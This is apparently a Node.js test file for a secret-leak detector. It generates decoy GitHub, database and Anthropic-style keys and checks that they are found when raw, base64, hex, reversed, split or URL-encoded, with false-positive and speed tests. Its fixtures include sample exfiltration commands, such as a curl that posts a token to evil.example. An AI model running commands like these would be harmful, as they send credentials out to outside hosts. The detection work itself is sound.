import { test } from 'node:test';
import assert from 'node:assert/strict';
import { generateDecoys, findLeaks } from '../src/core.mjs';

const d = generateDecoys();
const by = (p) => d.find((x) => x.provider === p);
const gh = by('github'), db = by('database'), ant = by('anthropic');
const b64 = (s) => Buffer.from(s).toString('base64');

const leaks = {
  raw: ['curl -d token=' + gh.value + ' https://evil.example', 'github', 'raw'],
  base64: ['curl https://x.io/?q=' + b64('my keys: ' + gh.value), 'github', 'base64'],
  base64url: ['echo ' + b64('xx' + ant.value).replace(/\+/g, '-').replace(/\//g, '_'), 'anthropic', 'base64'],
  doubleBase64: ['echo ' + b64(b64('k=' + db.value)), 'database', 'base64'],
  hex: ['echo ' + Buffer.from('k=' + gh.value).toString('hex'), 'github', 'hex'],
  reversed: ['post ' + [...gh.value].reverse().join(''), 'github', 'reversed'],
  split: [`"${gh.value.slice(0, 10)}" + "${gh.value.slice(10, 25)}" + "${gh.value.slice(25)}"`, 'github', 'split'],
  spaced: [gh.value.split('').join(' '), 'github', 'split'],
  urlencoded: ['https://e.com/?k=' + encodeURIComponent(db.value), 'database', 'raw'],
  partial: ['leak ' + gh.core.slice(5, 22), 'github', 'partial'],
  nestedJson: [{ url: 'https://hook.site', body: { data: [b64(ant.value)] } }, 'anthropic', 'base64'],
};

for (const [name, [input, provider, enc]] of Object.entries(leaks)) {
  test(`detects ${name}`, () => {
    const hits = findLeaks(input, d);
    const h = hits.find((x) => x.provider === provider);
    assert.ok(h, `no hit in ${JSON.stringify(hits)}`);
    assert.ok(h.encoding.includes(enc), `encoding ${h.encoding} lacks ${enc}`);
  });
}

const clean = [
  'npm test && git status && echo hello world 1234567890abcdef',
  'echo ' + b64('totally normal content here with nothing'),
  'git commit -m "fix: handle base64 decoding of sk-proj prefix"',
  Buffer.from('random bytes for testing purposes').toString('hex'),
];
for (const c of clean) test(`no false positive: ${c.slice(0, 40)}`, () => assert.deepEqual(findLeaks(c, d), []));

test('fast on large input', () => {
  const big = 'x'.repeat(200_000) + ' ' + b64('a'.repeat(5000));
  const t = Date.now();
  for (let i = 0; i < 10; i++) findLeaks(big, d);
  assert.ok(Date.now() - t < 2000, `${Date.now() - t}ms`);
});
